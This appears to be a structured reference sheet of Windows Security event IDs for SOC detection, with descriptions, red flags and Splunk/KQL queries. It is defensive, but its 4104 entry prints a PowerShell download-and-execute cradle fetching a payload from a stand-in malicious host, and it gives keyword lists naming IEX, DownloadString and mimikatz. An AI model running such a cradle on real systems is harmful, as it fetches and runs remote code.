eventIds.name: Successful Logon
eventIds.description: An account successfully logged on to a computer.
eventIds.detailedDescription: Event 4624 logs every successful logon to a system. Critical for detecting brute force success, credential misuse, and unauthorized access. Monitor Logon Type 10 (RDP) carefully.
eventIds.detectionStrategy: Monitor RDP logons (Type 10) from unusual IPs. Correlate with failed attempts (4625). Watch for service accounts doing interactive logons.

queries.splunk: index=windows EventCode=4624 LogonType=10 | stats count by SourceIPAddress, TargetUserName | where count > 5
queries.kql: SecurityEvent | where EventID == 4624 and LogonType == 10 | summarize count() by SourceIPAddress, Account | where count_ > 5

eventIds.example: User successfully logs in via RDP from IP 192.168.1.50

eventIds.name: Failed Logon
eventIds.description: An account failed to log on to a computer.
eventIds.detailedDescription: Event 4625 is generated every time a logon attempt fails. Multiple 4625 events can indicate brute force attack, password spraying, or credential misuse. This is ONE OF THE MOST IMPORTANT events for SOC analysts.
eventIds.detectionStrategy: Alert on >5 failed logons in 5 minutes from same IP. Watch for failed attempts to high-value accounts (admin, service accounts). Correlate with 4624 success.
redFlags: 5+ failed logons in short timeframe from same IP
Failed logons to multiple accounts from same IP

queries.splunk: index=windows EventCode=4625 | stats count as FailedCount by SourceIPAddress, TargetUserName | where FailedCount > 10 | sort - FailedCount
queries.kql: SecurityEvent | where EventID == 4625 | summarize FailCount = count() by SourceIPAddress, Account | where FailCount > 10

eventIds.example: Multiple failed RDP attempts from IP 203.0.113.50 to admin account

eventIds.name: Process Creation
eventIds.description: A new process has been created.
eventIds.detailedDescription: Event 4688 is generated when a new process is created. CRITICAL for detecting malware execution, unauthorized scripts, and suspicious activity. Must enable 'Audit Process Creation' in GPO.
keyFields: NewProcessName - Full path of new process
eventIds.detectionStrategy: Alert on suspicious parent-child relationships (WINWORD.EXE → powershell.exe). Monitor cmd.exe and powershell.exe from unexpected parents. Block encoded PowerShell.
redFlags: WINWORD.EXE or EXCEL.EXE spawning cmd.exe or powershell.exe
System process (svchost.exe) creating unusual child processes
Process creation from TEMP or AppData folder

queries.splunk: index=windows EventCode=4688 ParentProcessName="C:\\Program Files\\Microsoft Office\\*WINWORD.EXE" (NewProcessName="*cmd.exe" OR NewProcessName="*powershell.exe")
queries.kql: SecurityEvent | where EventID == 4688 and ParentProcessName contains "WINWORD" and (NewProcessName contains "cmd.exe" or NewProcessName contains "powershell.exe")

eventIds.example: WINWORD.EXE (spawned by user opening malicious Word document) creates powershell.exe with Base64-encoded command

eventIds.name: Process Terminated
eventIds.description: A process has exited.
eventIds.detailedDescription: Event 4689 is generated when a process terminates. Useful for timeline analysis and detecting process termination anomalies. Less critical than 4688 but valuable for correlation.
eventIds.detectionStrategy: Correlate with 4688 to build process timelines. Watch for processes terminated by unusual users. Useful for forensics.

queries.splunk: index=windows EventCode=4689 | stats count by ProcessName, SubjectUserName
queries.kql: SecurityEvent | where EventID == 4689 | summarize count() by ProcessName

eventIds.example: powershell.exe process terminates after 2 minutes of execution

eventIds.name: PowerShell Script Block Logging
eventIds.description: PowerShell Script Block logging captured execution of script content.
eventIds.detailedDescription: Event 4104 logs PowerShell script content REGARDLESS of obfuscation. This is CRITICAL for detecting encoded malware, Empire payloads, and malicious scripts. Found in Event Viewer under Windows PowerShell. Must enable via GPO: 'Turn on Module Logging' and 'Turn on Script Block Logging'.
keyFields: Path - Script location if from file
eventIds.detectionStrategy: Search for suspicious keywords: 'IEX', 'DownloadString', 'Base64', 'Invoke-', 'mimikatz', 'GetProcAddress'. Alert on encoded payloads. Monitor for Empire, Cobalt Strike signatures.
redFlags: Credentials in clear text in script

queries.splunk: index=windows EventCode=4104 ScriptBlockText IN ("*IEX*", "*DownloadString*", "*Base64*", "*mimikatz*")
queries.kql: Event | where EventID == 4104 and ScriptBlockText contains "IEX" or ScriptBlockText contains "DownloadString" or ScriptBlockText contains "mimikatz"

eventIds.example: PowerShell executes: IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

eventIds.name: PowerShell Module Logging
eventIds.description: PowerShell module and script information is being logged.
eventIds.detailedDescription: Event 4103 logs when PowerShell modules are loaded. Useful for detecting when malicious modules like ActiveDirectory, PSTools, or reconnaissance modules are loaded.
eventIds.detectionStrategy: Alert on suspicious module loading: mimikatz, PSTools, ActiveDirectory queries, SenseLogix. Look for modules loaded from unusual paths.

queries.splunk: index=windows EventCode=4103 ModuleName IN ("*mimikatz*", "*PSTools*", "*ActiveDirectory*")
queries.kql: Event | where EventID == 4103 and ModuleName contains "mimikatz"

eventIds.example: PowerShell loads ActiveDirectory module for credential enumeration

eventIds.name: Logon with Explicit Credentials
eventIds.description: A logon was attempted using explicit credentials.
eventIds.detailedDescription: Event 4648 is generated when someone uses explicit credentials (RunAs, script, scheduled task). CRITICAL for detecting credential misuse and lateral movement via credential delegation.
keyFields: SubjectUserName - User who ran the command
eventIds.detectionStrategy: Alert on RunAs usage from unusual users. Monitor scheduled tasks with explicit credentials. Watch for service accounts using explicit credentials.
redFlags: Explicit credentials to server not normally accessed
RunAs from user not in IT department

queries.splunk: index=windows EventCode=4648 TargetUserName="*admin*" | stats count by SubjectUserName, ProcessName
queries.kql: SecurityEvent | where EventID == 4648 and TargetUserName contains "admin" | summarize count() by SubjectUserName

eventIds.example: User runs: runas /user:DOMAIN\Administrator powershell.exe

eventIds.name: Special Privileges Assigned to New Logon
eventIds.description: Special privileges were assigned to a new logon.
eventIds.detailedDescription: Event 4672 is generated when an account with special privileges (admin, backup operators, etc.) logs in. CRITICAL for detecting privilege escalation and admin account misuse.
eventIds.detectionStrategy: Alert on admin/service account logons especially from unusual IPs. Monitor PrivilegeList for dangerous privileges like SE_DEBUG, SE_BACKUP. Correlate with 4624.
redFlags: Admin account logon from unusual IP
Multiple admin logons in short time

queries.splunk: index=windows EventCode=4672 SubjectUserName="*admin*" SourceIPAddress!="192.168.*" | stats count by SubjectUserName, SourceIPAddress
queries.kql: SecurityEvent | where EventID == 4672 and Account contains "admin" and SourceIPAddress !startswith "192.168" | summarize count() by Account

eventIds.example: DOMAIN\Administrator logs in from external IP with full privileges
